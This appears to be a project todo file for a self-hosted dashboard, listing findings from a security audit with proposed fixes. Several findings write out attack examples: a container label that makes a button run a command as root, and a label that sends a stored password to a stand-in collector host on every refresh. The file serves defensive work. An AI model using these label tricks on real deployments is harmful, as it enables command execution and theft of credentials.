# To do

Open work, roughly in order of value. Move an item to `completed.md` when it is done.
The widgets collection keeps its own list: `../dashboard-widgets/todo.md`.

## Security (audit of 2026-11-04)

Findings of a review of the server, discovery, the widget runtime, the installer, the image and
the page, most severe first. "Verified" means reproduced against the code as it is.

- [ ] **High: a Docker label (or Kubernetes annotation) can run commands on the dashboard.**
  Discovery passes every `dashboard.widget.*` / `homepage.widget.*` label into the widget's
  options, so `dashboard.widget.type=button` with `dashboard.widget.command=…` (and
  `dashboard.widget.user=root`) puts a button on the page that runs that command as `node`, or as
  root with `DASHBOARD_ALLOW_ROOT_SCRIPTS`. Labels come from whoever starts a container, and also
  from images: a `LABEL` baked into a third-party image is enough. The same goes for an Ingress
  annotation in Kubernetes, `script:` instead of `command:`, a `target: hidden-iframe` `href`
  (the server then calls any URL), an `iframe` `src` (adds a frame origin to the CSP) and any
  widget's `url` (server-side requests anywhere on the network). Verified for the button:
  `serviceFromLabels` returns `{ type: 'button', command: 'id > /tmp/pwned', user: 'root' }`.
  Fix: options that run things or reach elsewhere only from the YAML config; for discovered
  services refuse `button` `command`/`script`/`user`, `hidden-iframe`, and options listed by a new
  widget.yaml flag (e.g. `discoverable: false`), with a config message; or an allowlist of widget
  types discovery may create (`docker.yaml` `allowWidgets:`). Document it under Docker and Kubernetes.
- [ ] **High: a label can send the dashboard's secrets anywhere.** `src/discovery/index.js` runs
  every discovered service through `substitute()`, so a label can use any `{{DASHBOARD_VAR_*}}` or
  `{{HOMEPAGE_VAR_*}}` (all of the dashboard's environment variables of that form, not only its
  own): `dashboard.widget.type=custom-api`, `dashboard.widget.url=https://collector.example/`,
  `dashboard.widget.headers.X=…{{DASHBOARD_VAR_SHELLY_PASSWORD}}` makes the server send the
  password out on every refresh. Seen in the code (lines 53-58); the browser never sees it, the
  attacker's server does. Fix: no variable substitution in discovered labels by default (opt in
  per server in `docker.yaml`, or per name: `allowVariables: [GRAFANA]`); same fix as above for
  which options a label may set.
- [ ] **Low (with `*` only): DNS rebinding past the CSRF check.** Host names are checked by
  default now (only `localhost`, IP addresses and `allowedHosts`), which stops it. With
  `allowedHosts: "*"` a rebound page is same-origin again and may send
  `X-Requested-With: dashboard`. Fix: the POST endpoints also check that `Origin` matches `Host`.
- [ ] **Medium: no authentication for reading.** Presses can ask for the action password now
  (`DASHBOARD_ACTION_PASSWORD`), but every viewer still reads everything, and buttons without
  `confirm:` run for anyone. A docs page for forward-auth (Authelia, Authentik, Cloudflare Access)
  in front of the dashboard; maybe a passkey (WebAuthn) next to the password for HTTPS.
- [ ] **Medium: an installed widget reads every secret.** `src/plugins/sandbox.js` starts the
  worker without an `env` option, so it shares the process environment: any widget's `server.js`
  can read all `DASHBOARD_VAR_*` / `DASHBOARD_FILE_*` values and, with `fs`, the config folder
  (settings.yaml `providers:` too). The docs say a worker is no security boundary; still, cheap
  hardening: `new Worker(file, { env: {} })` (widgets get their options through `ctx`), and keep
  `DASHBOARD_FILE_*` paths out of it.
- [ ] **Medium: requests with params skip the cache.** `GET /api/widgets/<id>?<param>=…` caches
  per set of params, so a visitor varying a declared param (the weather widgets' coordinates)
  makes a fresh upstream call each time: unlimited calls on the user's API key (quota, cost) or
  load on a backend. There is no rate limit on any endpoint. Fix: a cap per instance (calls per
  refresh interval, a small LRU of param sets), and rounding/validation of params in the widgets.
- [ ] **Low: `docker.sock:ro` protects nothing.** A read-only bind mount of the socket still
  allows every API call (start, stop, exec), so the dashboard (and any widget or button in it)
  has full control of Docker. The docs recommend a docker-socket-proxy; say plainly that `:ro`
  does not help, in the Docker page and the README's compose example.
- [ ] **Low: unlimited event streams.** `/api/events` keeps every connection open with no cap
  per client; many open connections exhaust sockets and memory. Fix: a limit (overall and per
  address), and `server.headersTimeout`/`requestTimeout` set explicitly in `src/server.js`.
- [ ] **Low: symlinks are followed when serving files.** `safeJoin` checks the path, not its
  real path: a symlink in a widget package's `assets/` or in `config/icons/` serves whatever it
  points to (the config folder, keys). Widget code is trusted anyway, but a widget package is
  data too. Fix: `fs.realpath` and compare again, or refuse symlinks there.
- [ ] **Low: inline scripts and widget clients run with the page's rights.** The CSP allows
  `'unsafe-inline'` scripts, and every widget's `client.js` runs in the page itself: it can call
  the POST endpoints with the header, read `/api/layout`, and change other cards. By design, but
  worth a sentence in the security docs; a nonce for the page's own script would let the CSP
  drop `'unsafe-inline'`.
- [ ] **Info: root mode makes every widget root.** With `DASHBOARD_ALLOW_ROOT_SCRIPTS=true` the
  sudo rule (`NOPASSWD:SETENV` for `/usr/local/bin/dashboard-root`, which runs bash with any
  arguments) lets any code in the `node` process run anything as root. Documented; keep it that way.
- Checked and fine: no request bodies are read; `/widgets/<type>/` serves only `client.js` and
  `assets/` (resolved paths); secrets stay out of `/api/layout` and error messages; page text goes
  in through `textContent` and links through `safeHref`; widget `innerHTML` only inserts fixed
  markup; `npm pack` runs with `--ignore-scripts`, npm tarballs are pinned by integrity and git
  checkouts by commit, no submodules; `npm audit` finds nothing; the image runs as `node`.

## Docs site

- [ ] **Versions in the docs before 1.0.** The Migration section of
  `docs/configuration/README.md` and the API reference's Changes table still name versions;
  CLAUDE.md rules 2 and 6 require them, the wish is no versions before 1.0. Decide, and change
  the rules or the pages to match.

## Other

- [ ] A widget catalogue: an index (YAML in a separate repo) of known widget packages, shown in the docs.
